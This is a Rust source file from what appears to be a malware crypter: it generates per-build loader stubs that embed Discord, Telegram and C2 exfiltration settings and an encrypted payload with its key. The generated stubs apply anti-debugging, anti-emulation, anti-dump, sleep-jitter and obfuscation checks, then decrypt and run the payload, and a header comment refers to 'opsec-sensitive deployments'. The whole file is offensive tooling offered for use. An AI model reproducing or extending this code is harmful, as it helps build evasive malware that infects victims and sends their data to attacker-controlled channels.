//! Per-build stub source synthesizer.
//!
//! Emits diagnostic eprintln traces throughout main() so runtime
//! failures under Wine (or any environment) are visible on stderr.
//! Remove the `[stub]` traces for opsec-sensitive deployments.

mod emit_antidump;
mod emit_gates;
mod emit_helpers;
mod emit_junk;
mod emit_strings;
mod emit_vm;

use crypter_ir::*;
use crypter_vm::{seed_for_build, Encoding};
use rand::rngs::StdRng;
use rand::{Rng, SeedableRng};
use sha2::{Digest, Sha256};
use std::collections::HashSet;

pub struct Synth {
    pub(crate) rng: StdRng,
    pub(crate) seed: [u8; 32],
    pub(crate) xor_key: [u8; 32],
    helpers_emitted: HashSet<&'static str>,
}

impl Synth {
    pub fn new(seed: [u8; 32], xor_key: [u8; 32]) -> Self {
        Self {
            rng: StdRng::from_seed(seed),
            seed,
            xor_key,
            helpers_emitted: HashSet::new(),
        }
    }

    fn ensure_helper(&mut self, out: &mut String, name: &'static str) {
        if self.helpers_emitted.contains(name) { return; }
        self.helpers_emitted.insert(name);
        for dep in emit_helpers::deps_for(name) {
            self.ensure_helper(out, dep);
        }
        if let Some(src) = emit_helpers::source_for(name) {
            out.push_str(src);
            out.push('\n');
        }
    }

    fn ensure_helpers(&mut self, out: &mut String, names: &[&'static str]) {
        for n in names { self.ensure_helper(out, n); }
    }

    pub fn emit(&mut self, prog: &StubProgram) -> String {
        let payload_hash = {
            let mut h = Sha256::new();
            h.update(&prog.payload_blob);
            let d = h.finalize();
            let mut arr = [0u8; 32];
            arr.copy_from_slice(&d);
            arr
        };
        let isa_nonce = {
            let mut n = [0u8; 16];
            self.rng.fill(&mut n);
            n
        };
        let isa_seed = seed_for_build(&payload_hash, &isa_nonce);
        let encoding = Encoding::from_seed(&isa_seed);

        let mut out = String::with_capacity(96 * 1024);

        out.push_str("#![allow(unused_imports, unused_variables, dead_code)]\n");
        out.push_str("#![allow(non_snake_case, unused_mut, unused_assignments)]\n");
        out.push_str("#![allow(unreachable_code, unused_labels)]\n");
        out.push_str("#![allow(non_upper_case_globals)]\n");
        out.push_str("#![allow(unused_unsafe)]\n");
        out.push_str("use std::ffi::c_void;\n");
        out.push_str("use std::mem;\n");
        out.push_str("use std::ptr;\n");
        out.push_str("use std::hint::black_box;\n\n");

        // ─── secrets / directive / metadata ───────────────────────
        out.push_str("static EXFIL_DISCORD: &str = ");
        out.push_str(&rust_str_lit(&prog.discord));
        out.push_str(";\n");
        out.push_str("static EXFIL_TELEGRAM_TOKEN: &str = ");
        out.push_str(&rust_str_lit(&prog.telegram_token));
        out.push_str(";\n");
        out.push_str("static EXFIL_TELEGRAM_CHAT: &str = ");
        out.push_str(&rust_str_lit(&prog.telegram_chat));
        out.push_str(";\n");
        out.push_str("static EXFIL_C2_URL: &str = ");
        out.push_str(&rust_str_lit(&prog.c2_url));
        out.push_str(";\n");
        out.push_str("static EXFIL_C2_AUTH: &str = ");
        out.push_str(&rust_str_lit(&prog.c2_auth));
        out.push_str(";\n");
        out.push_str("static DIRECTIVE_JSON: &str = ");
        out.push_str(&rust_str_lit(&prog.directive_json));
        out.push_str(";\n");
        out.push_str("static BUILD_ID: &str = ");
        out.push_str(&rust_str_lit(&prog.build_id));
        out.push_str(";\n");
        out.push_str("static BUILD_PROFILE: &str = ");
        out.push_str(&rust_str_lit(&prog.profile));
        out.push_str(";\n\n");

        // ─── payload (sidecar include) ────────────────────────────
        out.push_str("const PAYLOAD: &[u8] = include_bytes!(\"../payload.bin\");\n\n");

        // ─── baked payload key ────────────────────────────────────
        out.push_str("const PAYLOAD_KEY: [u8; 32] = [");
        for (i, b) in prog.payload_key.iter().enumerate() {
            if i > 0 { out.push(','); }
            out.push_str(&format!("{:#04x}", b));
        }
        out.push_str("];\n\n");

        // ─── ISA tables ───────────────────────────────────────────
        out.push_str(&encoding.emit_rust());
        out.push('\n');

        // ─── encrypted config strings ─────────────────────────────
        out.push_str(&emit_strings::emit_encrypted_strings(&mut self.rng, &self.xor_key));
        out.push_str(&emit_strings::emit_decrypt_helper());

        // ─── gates ────────────────────────────────────────────────
        let mut gate_bodies: Vec<(String, Vec<&'static str>)> = Vec::new();
        for gate in &prog.gates {
            let fn_name = self.ident("g");
            let (body, helpers) =
                emit_gates::emit_gate(&mut self.rng, &fn_name, gate, &self.xor_key);
            gate_bodies.push((body, helpers));
        }

        let dbg_fn = self.ident("dbg");
        let (dbg_body, dbg_helpers) = emit_gates::emit_debug_check(&dbg_fn, &prog.debug_check);

        let emu_fn = self.ident("emu");
        let (emu_body, emu_helpers) = if prog.anti_emulation {
            emit_gates::emit_anti_emulation(&emu_fn, 5000, 0.8)
        } else {
            (format!("fn {}() -> bool {{ true }}\n\n", emu_fn), Vec::new())
        };

        let mut all_helpers: Vec<&'static str> = Vec::new();
        for (_, hs) in &gate_bodies { all_helpers.extend_from_slice(hs); }
        all_helpers.extend_from_slice(&dbg_helpers);
        all_helpers.extend_from_slice(&emu_helpers);
        all_helpers.sort();
        all_helpers.dedup();
        self.ensure_helpers(&mut out, &all_helpers);

        let mut gate_names: Vec<String> = Vec::new();
        for (body, _) in &gate_bodies { out.push_str(body); }
        for (body, _) in &gate_bodies {
            if let Some(rest) = body.strip_prefix("fn ") {
                if let Some(end) = rest.find('(') {
                    gate_names.push(rest[..end].to_string());
                }
            }
        }

        out.push_str(&dbg_body);
        out.push_str(&emu_body);

        // ─── anti-dump ────────────────────────────────────────────
        let antidump = self.ident("adp");
        out.push_str(&emit_antidump::emit_antidump_fn(&antidump, prog.target_os.clone()));

        // ─── resolver / decrypt / exec / integrity ────────────────
        let res_fn = self.ident("res");
        out.push_str(&emit_gates::emit_resolver_fn(&res_fn, &prog.resolver));

        let dec_fn = self.ident("dec");
        out.push_str(&self.emit_decrypt_fn(&dec_fn, &prog.decrypt));

        let exec_fn = self.ident("exec");
        out.push_str(&emit_gates::emit_exec_fn(&exec_fn, &prog.execution));

        let intg_fn = self.ident("chk");
        out.push_str(&emit_gates::emit_integrity(&intg_fn, &prog.integrity));

        // ─── exfil bootstrap ──────────────────────────────────────
        let exfil_init = self.ident("xinit");
        out.push_str(&self.emit_exfil_init(&exfil_init));

        // ─── VM ───────────────────────────────────────────────────
        if prog.virtualization {
            out.push_str(&emit_vm::emit_vm_dispatch(&mut self.rng, &self.seed));
        }

        // ─── main ─────────────────────────────────────────────────
        out.push_str("fn main() {\n");
        out.push_str("    eprintln!(\"[stub] start\");\n");

        if let Some(Gate::SleepJitter { min_ms, max_ms }) =
            prog.gates.iter().find(|g| matches!(g, Gate::SleepJitter { .. }))
        {
            let jitter = self.rng.gen_range(*min_ms..=*max_ms);
            out.push_str("    std::thread::sleep(std::time::Duration::from_millis(");
            out.push_str(&jitter.to_string());
            out.push_str("));\n");
            out.push_str("    eprintln!(\"[stub] jitter done (");
            out.push_str(&jitter.to_string());
            out.push_str("ms)\");\n");
        }

        if prog.anti_emulation {
            out.push_str("    if !");
            out.push_str(&emu_fn);
            out.push_str("() { eprintln!(\"[stub] anti-emu failed\"); return; }\n");
            out.push_str("    eprintln!(\"[stub] anti-emu ok\");\n");
        }

        out.push_str("    if ");
        out.push_str(&dbg_fn);
        out.push_str("() { eprintln!(\"[stub] debug check tripped\"); return; }\n");
        out.push_str("    eprintln!(\"[stub] debug ok\");\n");

        let mut gs = gate_names.clone();
        for i in (1..gs.len()).rev() {
            let j = self.rng.gen_range(0..=i);
            gs.swap(i, j);
        }
        for g in &gs {
            out.push_str("    if !");
            out.push_str(g);
            out.push_str("() { eprintln!(\"[stub] gate ");
            out.push_str(g);
            out.push_str(" failed\"); return; }\n");
        }
        out.push_str("    eprintln!(\"[stub] ");
        out.push_str(&gs.len().to_string());
        out.push_str(" gates passed\");\n");

        out.push_str("    if !");
        out.push_str(&intg_fn);
        out.push_str("() { eprintln!(\"[stub] integrity failed\"); return; }\n");

        out.push_str("    let pt = match ");
        out.push_str(&dec_fn);
        out.push_str("() { Some(p) => p, None => { eprintln!(\"[stub] decrypt returned None\"); return; } };\n");
        out.push_str("    eprintln!(\"[stub] decrypted {} bytes\", pt.len());\n");

        if prog.anti_dump {
            out.push_str("    let _guard = ");
            out.push_str(&antidump);
            out.push_str("::protect(&pt);\n");
            out.push_str("    ");
            out.push_str(&antidump);
            out.push_str("::unprotect(&_guard);\n");
        }

        out.push_str("    ");
        out.push_str(&exfil_init);
        out.push_str("();\n");
        out.push_str("    eprintln!(\"[stub] exfil init done\");\n");

        out.push_str("    ");
        out.push_str(&exec_fn);
        out.push_str("(&pt);\n");
        out.push_str("    eprintln!(\"[stub] exec returned\");\n");

        out.push_str(&emit_junk::emit_junk_block(&mut self.rng, prog.junk_density));

        out.push_str("}\n");

        out
    }

    fn ident(&mut self, prefix: &str) -> String {
        let alphabet: &[u8] = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        let len = self.rng.gen_range(6..12);
        let mut s = String::with_capacity(prefix.len() + 1 + len);
        s.push_str(prefix);
        s.push('_');
        for _ in 0..len {
            s.push(alphabet[self.rng.gen_range(0..alphabet.len())] as char);
        }
        s
    }

    fn emit_decrypt_fn(&mut self, name: &str, scheme: &DecryptScheme) -> String {
        let mut s = String::new();

        s.push_str("fn ");
        s.push_str(name);
        s.push_str("() -> Option<Vec<u8>> {\n");
        s.push_str("    let blob: &[u8] = PAYLOAD;\n");

        match scheme {
            DecryptScheme::AesGcm | DecryptScheme::ChaCha20Poly1305
            | DecryptScheme::AesCbcHmac => {
                // all AEAD schemes use the same wire format:
                // nonce(12) || ct || tag(16)
                s.push_str("    if blob.len() < 12 + 16 { return None; }\n");
                s.push_str("    let key = PAYLOAD_KEY;\n");
                s.push_str("    let (nonce, ct) = blob.split_at(12);\n");
                s.push_str("    let mut out = vec![0u8; ct.len() - 16];\n");
                s.push_str("    aes_gcm_decrypt(&key, nonce, ct, &mut out).ok()?;\n");
                s.push_str("    Some(out)\n");
            }
            DecryptScheme::XorDerived => {
                s.push_str("    let key = PAYLOAD_KEY;\n");
                s.push_str("    let mut out = vec![0u8; blob.len()];\n");
                s.push_str("    for (i, b) in blob.iter().enumerate() {\n");
                s.push_str("        out[i] = b ^ key[i % key.len()];\n");
                s.push_str("    }\n");
                s.push_str("    Some(out)\n");
            }
        }

        s.push_str("}\n\n");

        // real AES-256-GCM
        s.push_str("fn aes_gcm_decrypt(key: &[u8; 32], nonce: &[u8], ct_and_tag: &[u8], out: &mut [u8]) -> Result<(), ()> {\n");
        s.push_str("    use aes_gcm::aead::{Aead, KeyInit};\n");
        s.push_str("    use aes_gcm::{Aes256Gcm, Nonce};\n");
        s.push_str("    let cipher = Aes256Gcm::new(key.into());\n");
        s.push_str("    let n = nonce.get(..12).ok_or(())?;\n");
        s.push_str("    let pt = cipher.decrypt(Nonce::from_slice(n), ct_and_tag).map_err(|_| ())?;\n");
        s.push_str("    if pt.len() != out.len() { return Err(()); }\n");
        s.push_str("    out.copy_from_slice(&pt);\n");
        s.push_str("    Ok(())\n");
        s.push_str("}\n\n");

        s
    }

    fn emit_exfil_init(&mut self, name: &str) -> String {
        let mut s = String::new();
        s.push_str("fn ");
        s.push_str(name);
        s.push_str("() {\n");
        s.push_str("    let _ = EXFIL_DISCORD;\n");
        s.push_str("    let _ = EXFIL_TELEGRAM_TOKEN;\n");
        s.push_str("    let _ = EXFIL_TELEGRAM_CHAT;\n");
        s.push_str("    let _ = EXFIL_C2_URL;\n");
        s.push_str("    let _ = EXFIL_C2_AUTH;\n");
        s.push_str("    let _ = DIRECTIVE_JSON;\n");
        s.push_str("    let _ = BUILD_ID;\n");
        s.push_str("    let _ = BUILD_PROFILE;\n");
        s.push_str("}\n\n");
        s
    }
}

fn rust_str_lit(s: &str) -> String {
    let mut hashes = String::from("#");
    loop {
        let closer = format!("\"{}", hashes);
        if !s.contains(&closer) { break; }
        hashes.push('#');
    }
    let mut out = String::with_capacity(s.len() + hashes.len() * 2 + 3);
    out.push('r');
    out.push_str(&hashes);
    out.push('"');
    out.push_str(s);
    out.push('"');
    out.push_str(&hashes);
    out
}
